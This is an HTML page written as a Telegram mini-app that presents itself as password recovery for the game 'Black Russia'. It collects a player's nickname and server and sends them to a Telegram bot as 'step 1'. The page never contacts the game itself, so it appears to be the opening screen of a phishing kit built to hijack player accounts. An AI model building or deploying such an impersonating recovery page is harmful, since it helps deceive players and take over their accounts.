<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Black Russia — восстановление</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0a0a;
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: #111;
            border: 1px solid #cc0000;
            border-radius: 28px;
            padding: 32px 24px;
            width: 100%;
            max-width: 360px;
            box-shadow: 0 0 20px rgba(204,0,0,0.2);
        }
        h1 {
            text-align: center;
            color: #cc0000;
            font-size: 24px;
            letter-spacing: 2px;
            margin-bottom: 8px;
        }
        .sub {
            text-align: center;
            color: #888;
            font-size: 11px;
            margin-bottom: 28px;
        }
        input, select {
            width: 100%;
            padding: 14px;
            margin-bottom: 16px;
            background: #1a1a1a;
            border: 1px solid #2a2a2a;
            border-radius: 16px;
            color: white;
            font-size: 15px;
        }
        input:focus, select:focus {
            border-color: #cc0000;
            outline: none;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #cc0000;
            border: none;
            border-radius: 40px;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 8px;
        }
        button:active {
            background: #990000;
        }
    </style>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
<div class="card">
    <h1>⛓️ BLACK RUSSIA</h1>
    <div class="sub">восстановление пароля</div>

    <input type="text" id="nickname" placeholder="Игровой никнейм" autocomplete="off">
    <select id="server">
        <option value="" disabled selected>— Выбери сервер —</option>
    </select>
    <button id="submitBtn">ВОССТАНОВИТЬ</button>
</div>

<script>
    const servers = [
        "Red","Green","Blue","Yellow","Orange","Purple","Lime","Pink","Cherry","Black",
        "Indigo","White","Magenta","Crimson","Gold","Azure","Platinum","Aqua","Gray","Ice",
        "Chilli","Choco","Moscow","SPB","Ufa","Sochi","Kazan","Samara","Rostov","Anapa",
        "EKB","Krasnodar","Arzamas","Novosib","Grozny","Saratov","Omsk","Irkutsk","Volgograd",
        "Voronezh","Belgorod","Makhachkala","Vladikavkaz","Vladivostok","Kaliningrad","Chelyabinsk",
        "Krasnoyarsk","CHEBOKSARY","KHABAROVSK","PERM","TULA","RYAZAN","MURMANSK","PENZA","KURSK",
        "ARKHANGELSK","ORENBURG","KIROV","KEMEROVO","TYUMEN","TOLYATTI","IVANOVO","STAVROPOL","SMOLENSK",
        "PSKOV","BRYANSK","OREL","YAROSLAVL","BARNAUL","LIPETSK","ULYANOVSK","YAKUTSK","TAMBOV","BRATSK",
        "ASTRAKHAN","CHITA","KOSTROMA","VLADIMIR","KALUGA","NOVGOROD","TAGANROG","VOLOGDA","TVER","TOMSK",
        "IZHEVSK","SURGUT","PODOLSK","MAGADAN","CHEREPOVETS","NORILSK","ASTANA"
    ];

    const selectEl = document.getElementById('server');
    servers.forEach(s => {
        const opt = document.createElement('option');
        opt.value = s;
        opt.textContent = s;
        selectEl.appendChild(opt);
    });

    const tg = window.Telegram.WebApp;
    tg.expand();

    document.getElementById('submitBtn').addEventListener('click', () => {
        const nickname = document.getElementById('nickname').value.trim();
        const server = document.getElementById('server').value;

        if (!nickname) {
            tg.showAlert('❌ Напиши свой никнейм');
            return;
        }
        if (!server) {
            tg.showAlert('❌ Выбери сервер');
            return;
        }

        tg.sendData(JSON.stringify({
            step: 1,
            nickname: nickname,
            server: server
        }));
        tg.close();
    });
</script>
</body>
</html>
